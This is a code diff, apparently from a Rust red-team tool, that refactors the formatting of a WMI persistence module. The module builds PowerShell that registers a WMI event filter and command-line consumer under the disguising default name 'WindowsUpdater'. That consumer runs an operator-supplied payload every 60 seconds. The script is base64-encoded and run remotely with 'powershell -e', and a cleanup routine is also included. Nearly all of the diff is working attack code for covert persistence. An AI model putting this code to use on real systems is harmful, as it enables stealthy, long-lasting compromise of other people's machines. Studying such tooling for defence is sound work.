@@ -67,45 +67,35 @@ impl NxcModule for WmiPersistModule {
         opts: &ModuleOptions,
     ) -> Result<ModuleResult> {
         let action = opts.get("ACTION").map(|s| s.as_str()).unwrap_or("install");
-        let name = opts
-            .get("NAME")
-            .map(|s| s.as_str())
-            .unwrap_or("WindowsUpdater");
+        let name = opts.get("NAME").map(|s| s.as_str()).unwrap_or("WindowsUpdater");
 
         let script = if action == "install" {
             let payload = opts
                 .get("PAYLOAD")
                 .ok_or_else(|| anyhow::anyhow!("PAYLOAD option is required for install"))?;
             format!(
-                r#"$f=Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{{Name='{0}';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'}}
-$c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{{Name='{0}';CommandLineTemplate='{1}'}}
+                r#"$f=Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{{Name='{name}';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'}}
+$c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{{Name='{name}';CommandLineTemplate='{payload}'}}
 Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{{Filter=$f;Consumer=$c}}
-Write-Output 'WMI Persistence Installed Successfully'"#,
-                name, payload
+Write-Output 'WMI Persistence Installed Successfully'"#
             )
         } else if action == "cleanup" {
             format!(
-                r#"Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='{0}'" | Remove-WmiObject
-Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='{0}'" | Remove-WmiObject
-Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {{ $_.Filter -match '{0}' }} | Remove-WmiObject
-Write-Output 'WMI Persistence Cleaned Up Successfully'"#,
-                name
+                r#"Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='{name}'" | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='{name}'" | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {{ $_.Filter -match '{name}' }} | Remove-WmiObject
+Write-Output 'WMI Persistence Cleaned Up Successfully'"#
             )
         } else {
-            return Err(anyhow::anyhow!(
-                "Invalid ACTION: must be 'install' or 'cleanup'"
-            ));
+            return Err(anyhow::anyhow!("Invalid ACTION: must be 'install' or 'cleanup'"));
         };
 
         // Base64 encode the script to avoid quoting issues
         let b64_script = base64::Engine::encode(
             &base64::engine::general_purpose::STANDARD,
-            script
-                .encode_utf16()
-                .flat_map(|u| u.to_le_bytes())
-                .collect::<Vec<u8>>(),
+            script.encode_utf16().flat_map(|u| u.to_le_bytes()).collect::<Vec<u8>>(),
         );
-        let cmd = format!("powershell -e {}", b64_script);
+        let cmd = format!("powershell -e {b64_script}");
 
         // Execute via the active protocol
         let output = match session.protocol() {
